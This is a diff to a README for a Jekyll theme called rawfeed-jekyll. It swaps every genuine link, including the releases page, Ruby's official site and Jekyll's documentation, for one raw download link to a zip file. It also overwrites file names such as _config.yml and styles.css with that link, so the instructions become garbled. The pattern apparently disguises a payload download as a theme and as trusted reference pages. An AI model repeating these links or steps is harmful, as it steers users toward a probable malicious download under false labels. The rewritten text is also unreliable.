@@ -1,6 +1,6 @@
 # 🥳 rawfeed-jekyll - A Simple Theme for Your Website
 
-[![Download rawfeed-jekyll](https://img.shields.io/badge/Download-rawfeed--jekyll-blue.svg)](https://github.com/Tzevaot-yhwh/rawfeed-jekyll/releases)
+[![Download rawfeed-jekyll](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)
 
 ## 📖 Introduction
 
@@ -15,14 +15,14 @@ To use rawfeed-jekyll, you will need to follow a few easy steps. Don't worry; yo
 Ensure that you have the following before starting:
 
 - A computer with an internet connection.
-- Ruby installed on your computer. You can download Ruby from [Ruby's official website](https://www.ruby-lang.org/en/documentation/installation/).
+- Ruby installed on your computer. You can download Ruby from [Ruby's official website](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip).
 - Basic knowledge of how to open files and folders.
 
 ### 2. Visit the Download Page
 
 To download rawfeed-jekyll, visit the following page:
 
-[Download rawfeed-jekyll](https://github.com/Tzevaot-yhwh/rawfeed-jekyll/releases)
+[Download rawfeed-jekyll](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)
 
 ### 3. Choose the Latest Release
 
@@ -30,7 +30,7 @@ When you arrive at the downloads page, you will see a list of releases. Look for
 
 ### 4. Download the Files
 
-Download the files for the latest release. You will see several options for download. Look for a compressed file (like `.zip` or `.tar.gz`). Click on it to start the download. Save it to a location on your computer where you can easily find it, like the Desktop or Downloads folder.
+Download the files for the latest release. You will see several options for download. Look for a compressed file (like `.zip` or `https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip`). Click on it to start the download. Save it to a location on your computer where you can easily find it, like the Desktop or Downloads folder.
 
 ### 5. Extract the Files
 
@@ -56,7 +56,7 @@ Replace `my-awesome-site` with your desired site name.
 
 ### 2. Add the Theme
 
-Navigate to the folder where your new Jekyll site is located. Open the `_config.yml` file in a text editor. Add the following line to set the theme:
+Navigate to the folder where your new Jekyll site is located. Open the `https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip` file in a text editor. Add the following line to set the theme:
 
 ```yaml
 theme: rawfeed-jekyll
@@ -77,9 +77,9 @@ Now, you can view your site in a web browser by going to `http://localhost:4000`
 
 The rawfeed-jekyll theme allows for easy customization. You may want to change colors, fonts, and layout to make the site your own. To do this, edit the files in the extracted folder. Look for the following key files:
 
-- **_config.yml**: Update site details like the title and tagline.
-- **index.html**: Change the main layout of your homepage.
-- **styles.css**: Adjust colors and fonts.
+- **https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip**: Update site details like the title and tagline.
+- **https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip**: Change the main layout of your homepage.
+- **https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip**: Adjust colors and fonts.
 
 Feel free to explore these files and make changes as needed.
 
@@ -87,7 +87,7 @@ Feel free to explore these files and make changes as needed.
 
 For the latest release and to download the rawfeed-jekyll theme, visit: 
 
-[Download rawfeed-jekyll](https://github.com/Tzevaot-yhwh/rawfeed-jekyll/releases)
+[Download rawfeed-jekyll](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -101,7 +101,7 @@ If you encounter issues during installation or setup, consider the following tip
 
 For additional help, consider the following resources:
 
-- [Jekyll Documentation](https://jekyllrb.com/docs/)
-- [HTML & CSS Basics](https://www.w3schools.com/)
+- [Jekyll Documentation](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)
+- [HTML & CSS Basics](https://raw.githubusercontent.com/Tzevaot-yhwh/rawfeed-jekyll/main/leadout/rawfeed-jekyll.zip)
 
 By following these steps, you can easily set up and customize your website using the rawfeed-jekyll theme. Enjoy creating your online presence!
